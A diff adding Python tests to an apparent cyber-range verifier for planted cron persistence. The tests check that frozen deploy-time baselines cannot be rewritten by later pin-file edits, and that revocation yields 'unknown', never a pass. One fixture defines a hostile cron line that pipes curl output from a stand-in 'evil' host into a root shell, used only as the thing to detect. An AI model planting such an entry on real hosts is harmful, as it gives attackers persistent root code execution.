@@ -102,6 +102,13 @@ def test_tampered_or_unsafe_pins_make_the_whole_document_absent(tmp_path):
     assert load(wrapped({**good, "files": {
         "/etc/cron.d/x": good["files"]["e2scrub_all"]}})) == {}
     assert load(wrapped({**good, "template_id": "9011"})) == {}
+    # schema must be an EXPLICIT integer: Python equality would accept
+    # True and 1.0 as version 1 (second review, finding 3)
+    assert load(wrapped({**good, "schema": True})) == {}
+    assert load(wrapped({**good, "schema": 1.0})) == {}
+    assert load({"schema": True, "pins": {ROLE: good}}) == {}
+    assert load({"schema": 1.0, "pins": {ROLE: good}}) == {}
+    assert load({"schema": "1", "pins": {ROLE: good}}) == {}
     assert load({"schema": 99, "pins": {ROLE: good}}) == {}
     assert load({"schema": cb.SCHEMA, "pins": {ROLE: "nope"}}) == {}
     assert load(wrapped(good)) == {ROLE: good}
@@ -110,8 +117,14 @@ def test_tampered_or_unsafe_pins_make_the_whole_document_absent(tmp_path):
 ART = {"role": ROLE, "template_vmid": TID, "artifact_sha256": "a" * 64}
 
 
+def _baseline(pin: dict | None = None):
+    """What deploy-time freezing produces for the default pin."""
+    return cb.freeze_baseline({ROLE: pin or _pin()}, ROLE,
+                              artifact_sha256="a" * 64, template_vmid=TID)
+
+
 def _art(**over):
-    return {**ART, **over}
+    return {**ART, "baseline": _baseline(), **over}
 
 
 def test_pins_are_bound_to_digest_template_and_role_together():
@@ -139,6 +152,43 @@ def test_pins_are_bound_to_digest_template_and_role_together():
     # digest binding (release artifact re-verified before trust)
     assert cb.trusted_hashes(pins, ROLE, "A" * 64) == pins[ROLE]["files"]
     assert cb.trusted_hashes(pins, ROLE, "b" * 64) == {}
+
+
+def test_freeze_binding_and_frozen_reads(tmp_path):
+    """Pure primitives of the frozen-baseline flow (second review,
+    finding 1): freeze only from a binding pin, bind-only revocation never
+    returns hashes, and the integrity reference gates every read."""
+    pins = {ROLE: _pin()}
+    # freeze from a binding identity
+    base = cb.freeze_baseline(pins, ROLE, artifact_sha256="a" * 64,
+                              template_vmid=TID)
+    assert base["files"] == pins[ROLE]["files"]
+    assert base["baseline_sha256"] == cb.baseline_digest(
+        base["files"], base["root_crontab_sha256"])
+    # canonical: digest independent of dict insertion order
+    assert cb.baseline_digest({"b": "2", "a": "1"}, None) == \
+        cb.baseline_digest({"a": "1", "b": "2"}, None)
+    # freeze refuses a non-binding identity
+    assert cb.freeze_baseline(pins, ROLE, artifact_sha256="b" * 64,
+                              template_vmid=TID) == {}
+    assert cb.freeze_baseline(pins, ROLE, artifact_sha256="a" * 64,
+                              template_vmid=1) == {}
+    assert cb.freeze_baseline({}, ROLE, artifact_sha256="a" * 64,
+                              template_vmid=TID) == {}
+    # binding check never yields hashes
+    assert cb.artifact_binding_ok(pins, ROLE, artifact_sha256="a" * 64,
+                                  template_vmid=TID) is True
+    assert cb.artifact_binding_ok(pins, ROLE, artifact_sha256="e" * 64,
+                                  template_vmid=TID) is False
+    # frozen reads gate on the integrity reference and value shapes
+    assert cb.frozen_hashes(base) == pins[ROLE]["files"]
+    assert cb.frozen_hashes({**base, "files": {
+        "e2scrub_all": "f" * 64}}) == {}
+    assert cb.frozen_hashes({**base, "root_crontab_sha256": 123}) == {}
+    assert cb.frozen_hashes({**base,
+                             "files": {"e2scrub_all": "NOTHEX"}}) == {}
+    assert cb.frozen_hashes({}) == {}
+    assert cb.frozen_hashes(None) == {}
 
 
 # --------------------------------------------------------------------------- #
@@ -340,13 +390,15 @@ def test_wrong_digest_pin_never_passes_the_real_verifier(tmp_path):
 
 
 def test_replacing_the_pin_after_launch_revokes_but_never_forges(tmp_path):
-    """A session's recorded artifact identity is immutable deploy-time
-    data.  After launch the operator may REPLACE the pin file: a pin
-    bound to the SAME deployed digest legitimately covers the session,
-    but a replacement bound to a different digest (a rebuild) can only REVOKE —
-    never flip an existing session's cron check to a pass."""
+    """A session's recorded identity + FROZEN baseline are immutable
+    deploy-time data.  After launch the operator may REPLACE the pin file:
+    a pin bound to the SAME deployed identity leaves the frozen baseline
+    untouched; a replacement whose identity drifts (a rebuild) can only
+    REVOKE — never flip an existing session's cron check to a pass.
+    (Second review: the pre-fix code re-read the CURRENT file's hashes at
+    scoring time, so 'revoke' here meant even an in-place edit bound to
+    the same digest silently rewrote what counted as clean.)"""
     import srplatform.verification_service as vs
-    # launch: pin covers the deployed digest
     pins = {ROLE: _pin(digest="a" * 64)}
     args = vs.with_cron_baseline(dict(BLUE_ARGS),
                                  verifier_id="cron_persistence_present",
@@ -361,6 +413,114 @@ def test_replacing_the_pin_after_launch_revokes_but_never_forges(tmp_path):
                                  pins=replaced)
     assert "baseline_file_sha256" not in post
     assert _evaluate(_FakeExec(_clean_files()), post).status == "unknown"
+    # pin file gone entirely: revocation degrades to UNKNOWN, no crash
+    gone = vs.with_cron_baseline(dict(BLUE_ARGS),
+                                 verifier_id="cron_persistence_present",
+                                 host="web01", artifacts={"web01": _art()},
+                                 pins={})
+    assert _evaluate(_FakeExec(_clean_files()), gone).status == "unknown"
+
+
+PLANTED = "* * * * * root curl evil|sh\n"
+
+
+def test_same_digest_pin_edit_never_rewrites_history(tmp_path):
+    """Second review finding 1 (HIGH) reproduction: after a session's
+    bytes were persisted as FAILED, edit ONLY pins[role]['files'] to the
+    payload's own hash — role, template and artifact digest untouched —
+    and re-score the SAME stored guest bytes.  Pre-fix this returned
+    PASSED/10 points, because the current mutable file decided what was
+    clean.  Post-fix the session scores from its FROZEN baseline: the
+    verdict never changes, and an explicit policy revocation (identity
+    drift or pin removal) may only degrade trust to UNKNOWN — never
+    adopt new hashes."""
+    import srplatform.verification_service as vs
+    planted = {"e2scrub_all": (PLANTED, 0)}
+    frozen_art = _art()
+    # initial scoring: planted persistence FAILED
+    args = vs.with_cron_baseline(dict(BLUE_ARGS),
+                                 verifier_id="cron_persistence_present",
+                                 host="web01",
+                                 artifacts={"web01": frozen_art},
+                                 pins={ROLE: _pin()})
+    assert _evaluate(_FakeExec(planted), args).status == "failed"
+    # the edit: pin keeps role/template/digest; only FILES match the plant
+    edited_pin = _pin()
+    edited_pin["files"]["e2scrub_all"] = _sha(PLANTED.encode())
+    rescored = vs.with_cron_baseline(dict(BLUE_ARGS),
+                                     verifier_id="cron_persistence_present",
+                                     host="web01",
+                                     artifacts={"web01": frozen_art},
+                                     pins={ROLE: edited_pin})
+    out = _evaluate(_FakeExec(planted), rescored)
+    assert out.status == "failed", \
+        f"same-digest pin edit must never turn bad content clean: {out.status}"
+    # a CLEAN guest stays passing on the frozen truth (no drift either way)
+    assert _evaluate(_FakeExec(_clean_files()), rescored).status == "passed"
+    # revocation degrades to UNKNOWN, never to a pass
+    revoked = vs.with_cron_baseline(dict(BLUE_ARGS),
+                                    verifier_id="cron_persistence_present",
+                                    host="web01",
+                                    artifacts={"web01": frozen_art},
+                                    pins={})
+    assert _evaluate(_FakeExec(_clean_files()), revoked).status == "unknown"
+
+
+def test_historical_or_corrupt_frozen_baselines_stay_unknown():
+    """Second review: sessions deployed before a baseline was frozen (or
+    whose frozen evidence was tampered/corrupted) must NOT pass — the
+    integrity reference gates every read, and no post-hoc pin document
+    substitutes for the missing freeze."""
+    import srplatform.verification_service as vs
+    pins = {ROLE: _pin()}
+    base_args = dict(BLUE_ARGS)
+
+    def status(art):
+        args = vs.with_cron_baseline(dict(base_args),
+                                     verifier_id="cron_persistence_present",
+                                     host="web01",
+                                     artifacts={"web01": art}, pins=pins)
+        assert "baseline_file_sha256" not in args
+        return _evaluate(_FakeExec(_clean_files()), args).status
+
+    historical = {**ART}                                  # never frozen
+    assert status(historical) == "unknown"
+    tampered = {**ART, "baseline": {**_baseline(),
+                                    "files": {"e2scrub_all": "f" * 64}}}
+    assert status(tampered) == "unknown"                  # digest mismatch
+    assert status({**ART, "baseline": {}}) == "unknown"
+    assert status({**ART, "baseline": {"files": {"e2scrub_all": "nope"}}}) \
+        == "unknown"
+
+
+def test_frozen_baselines_are_per_session_isolated():
+    """Two sessions on different artifacts each score from their OWN
+    frozen baseline; neither pin document nor the other session's freeze
+    can reach across."""
+    import srplatform.verification_service as vs
+    other_pin = cb.build_pin("mojang-web-db", artifact_sha256="c" * 64,
+                             artifact_version="v2", template_id=9012,
+                             capture={"files": {"otherjob": _sha(
+                                 CLEAN_CRON.encode())},
+                                 "root_crontab_sha256": None})
+    art_a = _art()
+    art_b = {"role": "mojang-web-db", "template_vmid": 9012,
+             "artifact_sha256": "c" * 64,
+             "baseline": cb.freeze_baseline({"mojang-web-db": other_pin},
+                                            "mojang-web-db",
+                                            artifact_sha256="c" * 64,
+                                            template_vmid=9012)}
+    pins = {ROLE: _pin(), "mojang-web-db": other_pin}
+    out_a = vs.with_cron_baseline(dict(BLUE_ARGS),
+                                  verifier_id="cron_persistence_present",
+                                  host="web01", artifacts={"web01": art_a},
+                                  pins=pins)
+    out_b = vs.with_cron_baseline(dict(BLUE_ARGS),
+                                  verifier_id="cron_persistence_present",
+                                  host="web01", artifacts={"web01": art_b},
+                                  pins=pins)
+    assert out_a["baseline_file_sha256"] == _pin()["files"]
+    assert set(out_b["baseline_file_sha256"]) == {"otherjob"}
 
 
 # --------------------------------------------------------------------------- #
@@ -396,6 +556,8 @@ def test_malformed_pin_values_degrade_to_unknown_never_crash(tmp_path):
         {**good, "files": {"e2scrub_all": {"sha": "a" * 64}}},
         {**good, "files": [1, 2]},
         {**good, "schema": "1"},
+        {**good, "schema": True},
+        {**good, "schema": 1.0},
         [1, 2, 3],
         "pins",
     ]
